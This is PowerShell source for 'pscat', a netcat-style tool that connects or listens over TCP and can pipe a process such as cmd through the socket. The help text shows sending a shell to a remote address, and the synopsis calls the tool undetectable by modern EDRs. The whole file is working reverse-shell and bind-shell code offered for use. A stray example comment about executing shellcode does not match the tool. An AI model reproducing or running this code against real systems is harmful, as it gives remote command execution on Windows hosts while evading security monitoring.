class stream
{
    [String]       $Name
    [IO.Stream]    $IOStream
    [Byte[]]       $Buffer
    [IAsyncResult] $AsyncResult
}

class pscat
{
    [String]         $Address
    [String]         $Port
    [String]         $Command
    [Text.Encoding]  $Encoding
    [PSCustomObject] $Objects
    [Object[]]       $Streams
    [Bool]           $RedirectorPresent

    pscat ([String] $Address, [String] $Port)
    {
        $this.Address                   = $Address
        $this.Port                      = $Port
        $this.Command                   = ""
        $this.Encoding                  = [Text.Encoding]::ASCII
        $this.Objects                   = [PSCustomObject] @{
            TcpClient                   = $null
            Process                     = $null
        }
        $this.Streams                   = @()
        $this.RedirectorPresent         = [Console]::IsInputRedirected
    }

    [Bool] Start_Connect([Bool] $Verbosity = $false)
    {
        if ($Verbosity)
        {
           Write-Host "connecting [$($this.Address)] $($this.Port) ..."
        }

        $TcpClient                      = [Net.Sockets.TcpClient]::new($this.Address, $this.Port)

        if (-not $TcpClient)
        {
            return $false
        }

        $this.Objects.TcpClient         = $TcpClient

        return $true
    }

    [Bool] Start_Listen([Bool] $Verbosity = $false)
    {
        if ($Verbosity)
        {
            Write-Host "listening on [$($this.Address)] $($this.Port) ..."
        }
        
        $TcpListener                    = [Net.Sockets.TcpListener]::new($this.Address, $this.Port)
        $TcpListener.Start()
        $TcpClient                      = $TcpListener.AcceptTcpClient()

        $LocalConnectionAddress         = $TcpClient.Client.LocalEndPoint.Address
        $RemoteConnectionAddress        = $TcpClient.Client.RemoteEndPoint.Address
        $RemoteConnectionPort           = $TcpClient.Client.RemoteEndPoint.Port

        if ($Verbosity)
        {
            Write-Host "connect to [$LocalConnectionAddress] from [$RemoteConnectionAddress] $RemoteConnectionPort"
        }
        
        if (-not $TcpClient)
        {
            return $false
        }

        $TcpListener.Stop()
        $this.Objects.TcpClient         = $TcpClient

        return $true
    }

    [Bool] Start_DiagnosticsProcess([String] $ProcessName, [String] $Arguments)
    {
        $Info                           = [Diagnostics.ProcessStartInfo]::new()
        $Info.FileName                  = $ProcessName
        $Info.Arguments                 = $Arguments
        $Info.UseShellExecute           = $false
        $Info.RedirectStandardInput     = $true
        $Info.RedirectStandardOutput    = $true
        $Info.RedirectStandardError     = $true
        $Process                        = [Diagnostics.Process]::Start($Info)

        if (-not $Process)
        {
            return $false
        }

        $this.Objects.Process           = $Process

        return $true
    }

    [Object[]] Start_AsyncRead([IO.Stream] $Stream)
    {
        $ReadingBuffer                  = [Byte[]]::new(65535)
        $ReadingOperation               = $Stream.BeginRead($ReadingBuffer, 0, $ReadingBuffer.Length, $null, $null)

        return $ReadingBuffer, $ReadingOperation
    }

    [Stream] Make_Stream([String] $Name, [IO.Stream] $IOStream, [Byte[]] $Buffer, [IAsyncResult] $AsyncResult)
    {
        $Stream                         = [Stream]::new()
        $Stream.Name                    = $Name
        $Stream.IOStream                = $IOStream
        $Stream.Buffer                  = $Buffer
        $Stream.AsyncResult             = $AsyncResult

        return $Stream
    }

    [Void] Setup_Streams()
    {
        if ($this.Objects.TcpClient)
        {
            $IOStream                   = $this.Objects.TcpClient.GetStream()
            $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)

            $this.Streams              += $this.Make_Stream("TcpStream", $IOStream, $ReadBuffer, $ReadOp)
        }

        if ($this.RedirectorPresent)
        {
            $IOStream                   = [Console]::OpenStandardInput()
            $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)

            $this.Streams              += $this.Make_Stream("StdInStream", $IOStream, $ReadBuffer, $ReadOp)
        }

        if ($this.Objects.Process)
        {
            $IOStream                   = $this.Objects.Process.StandardOutput.BaseStream
            $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)

            $this.Streams              += $this.Make_Stream("StdOutStream", $IOStream, $ReadBuffer, $ReadOp)

            $IOStream                   = $this.Objects.Process.StandardError.BaseStream
            $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)

            $this.Streams              += $this.Make_Stream("StdErrStream", $IOStream, $ReadBuffer, $ReadOp)
        }
    }

    [String] Process_Streams([Int] $StreamIndex)
    {
        $Stream                         = $this.Streams[$StreamIndex]
        $Data                           = $null

        if ($Stream.AsyncResult.IsCompleted)
        {
            $Length                     = $Stream.IOStream.EndRead($Stream.AsyncResult)

            if ($Length -eq 0)
            {
                return $null
            }

            $Data                       = $this.Encoding.GetString($Stream.Buffer, 0, $Length)
            $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($Stream.IOStream)
            $Stream                     = $this.Make_Stream($Stream.Name, $Stream.IOStream, $ReadBuffer, $ReadOp)
            $this.Streams[$StreamIndex] = $Stream
        }

        return $Data
    }

    [Void] Update_DiagnosticsProcess()
    {
        foreach ($Stream in 0..2)
        {
            $Data                       = $this.Process_Streams($Stream)
            $Bytes                      = $this.Encoding.GetBytes($Data)

            if ($Data -eq $null)
            {
                continue
            }

            if ($Stream -eq 0)
            {
                $this.Objects.Process.StandardInput.BaseStream.Write($Bytes, 0, $Bytes.Length)
                $this.Objects.Process.StandardInput.BaseStream.Flush()
            }
            else
            {
                $this.Streams[0].IOStream.Write($Bytes, 0, $Bytes.Length)
                $this.Streams[0].IOStream.Flush()
            }
        }
    }

    [Void] Update_Console()
    {
        $KeyPressed                     = [Console]::ReadKey($true)
        $CursorPosition                 = [Console]::CursorLeft

        if ($KeyPressed.Key -eq "Enter")
        {
            $this.Command              += "`n"
            $RawCommand                 = $this.Encoding.GetBytes($this.Command)
            $this.Streams[0].IOStream.Write($RawCommand, 0, $RawCommand.Length)
            $this.Streams[0].IOStream.Flush()
            [Console]::WriteLine()
            $this.Command               = ""
        }
        elseif ($KeyPressed.Key -eq "Backspace") 
        {
            if ($this.Command.Length -gt 0) 
            {
                $this.Command           = $this.Command.Substring(0, $this.Command.Length - 1)
                [Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop)
                [Console]::Write(" ")
                [Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop)
            }
        }
        else
        {
            $this.Command              += $KeyPressed.KeyChar
            [Console]::Write($KeyPressed.KeyChar)
        }
    }

    [Void] Update_Redirector()
    {
        $Data                           = $this.Process_Streams(1)

        if (-not $Data)
        {
            return
        }

        $Bytes                          = $this.Encoding.GetBytes($Data)
        $this.Streams[0].IOStream.Write($Bytes, 0, $Bytes.Length)
        $this.Streams[0].IOStream.Flush()
    }

    [Void] Update_TcpConnection()
    {
        $Data                           = $this.Process_Streams(0)

        if ($Data)
        {
            [Console]::Write($Data)
        }

        if ($this.RedirectorPresent)
        {
            $this.Update_Redirector()
            return
        }

        if ([Console]::KeyAvailable) 
        {
            $this.Update_Console()
        }
    }

    [Void] Close_Streams()
    {
        foreach ($Stream in $this.Streams)
        {
            $Stream.IOStream.Close()
        }

        if ($this.Objects.TcpClient)
        {
            $this.Objects.TcpClient.Close
        }

        if ($this.Objects.Process)
        {
            $this.Objects.Process.Kill()
        }
    }
}

function pscat
{
<#
.SYNOPSIS
    This is a simple proof-of-concept (POC) for a network concatenation tool usuing PowerShell and the .NET framework.
    
    There’s nothing novel here — this method is well-known and widely used. Luckily, it’s and amazing network 
    administration tool that is not detectable by modern EDRs and serves primarily as an educational demonstration.
    
    Notes:
        - I tested this POC on x64 Win11.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
    # Create a local thread that executes shellcode.
    # x64 Win10 RS4
    PS C:\> pscat -l -p 4444 -verbosemode
    listening on [0.0.0.0] 4444 ...
    connect to [127.0.0.1] from [127.0.0.1] 65432
#>

    [CmdletBinding()]
    param(
        [Switch] $Connect,
        [Switch] $Listen,
        [String] $Address,
        [String] $Port,
        [String] $Execute,
        [Switch] $VerboseMode,
        [Switch] $Help
    )

    $HelpDialogue                       = @"
pscat - PowerShell Network Concatenation.
Github Repository: https://github.com/SilentisVox/pscat

This script implements the features of netcat in a powershell script.

Usage: pscat [-Connect -c | -Listen -l] [-Address -a <address>] [-Port -p <port>] [options]

  -c              Client Mode. Provide the IP and port of the system you wish to connect to.
            
  -l              Listen Mode. Start a listener on the port specified by -p.

  -a              Address. The address to connect to, or the to listen on

  -p  <port>      Port. The port to connect to, or to listen on.
  
  -e  <proc>      Execute. Specify the name of the process to start.

Examples:

  Listen on port 8000 and print the output to the console.
      pscat -l -p 8000
  
  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
      pscat -c 10.1.1.1 443 -e cmd -verbosemode
"@

    if ($Help)
    {
        return $HelpDialogue
    }

    if (-not ($Connect -xor $Listen))
    {
        if ($VerboseMode)
        {
            Write-Host "please specify connect/listen only."
        }
        return
    }

    if ($Connect -and ((-not $Address) -or (-not $Port)))
    {
        if ($VerboseMode)
        {
            Write-Host "please specify full address []:[]."
        }
        return
    }

    if ($Listen -and -not $Address)
    {
        $Address                        = [Net.IPAddress]::Any
    }

    if ($Listen -and (-not $Port))
    {
        if ($VerboseMode)
        {
            Write-Host "please specify full address []:[]."
        }
        return
    }

    $TcpClient                          = [pscat]::new($Address, $Port)

    if ($Connect)
    {
        $RESULT                         = $TcpClient.Start_Connect($VerboseMode)
    }

    if ($Listen)
    {
        $RESULT                         = $TcpClient.Start_Listen($VerboseMode)
    }

    if (-not $RESULT)
    {
        if ($VerboseMode)
        {
            Write-Host "failed to connect to host."
        }
        return
    }

    if ($Execute)
    {
        $CommandLine                    = @($Execute -split '\s+', 2)
        $Executable                     = $CommandLine[0]

        if ($CommandLine.Count -gt 1)
        {
            $Arguments                 = $CommandLine[1]
        }

        $RESULT                         = $TcpClient.Start_DiagnosticsProcess($Executable, $Arguments)

        if (-not $RESULT)
        {
            if ($VerboseMode)
            {
                Write-Host "failed to start process."
            }
            return
        }
    }

    $TcpClient.Setup_Streams()

    $Action                             = @{
        $true                           = {
            $TcpClient.Update_DiagnosticsProcess()
        }
        $false                          = {
            $TcpClient.Update_TcpConnection()
        }
    }

    $Mode                               = $Action[[Bool] $Execute]

    try
    {
        while ($true)
        {
            & $Mode
        }
    }
    finally
    {
        $TcpClient.Close_Streams()
    }
}

Set-Alias pc pscat